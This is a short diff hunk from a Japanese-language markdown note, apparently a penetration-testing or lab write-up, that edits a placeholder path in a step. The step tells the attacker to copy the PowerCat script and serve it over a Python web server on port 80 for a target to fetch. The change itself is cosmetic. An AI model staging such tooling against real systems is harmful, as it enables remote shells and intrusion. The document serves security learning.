@@ -160,7 +160,7 @@ $$PowerShell起動$$
 1. 攻撃者のマシンでPowerCatファイルをコピーし、コピー先のディレクトリ上でPython webサーバーを用意しておく
 ```zsh
 locate powercat.ps1
-cp [/path/to/powercat.ps1] .
+cp <path_to_powercat.ps1> .
 sudo python -m http.server 80
 ```
 
